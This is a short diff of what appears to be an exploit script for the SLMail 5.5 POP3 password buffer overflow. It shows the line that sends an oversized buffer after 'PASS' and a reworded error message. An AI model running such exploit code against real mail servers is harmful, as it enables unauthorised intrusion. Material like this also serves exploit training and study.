@@ -64,4 +64,4 @@ try:
     s.send('PASS ' + buffer + '\r\n')             # Send Password and buffer
     s.close()
 except:
-    print('There was a problem! Please check your code and if the server is vulnerable and SLMail 5.5 is running on the target.')
+    print('There was a problem! Please check your code and confirm the server is vulnerable and SLMail 5.5 is running on the target.')
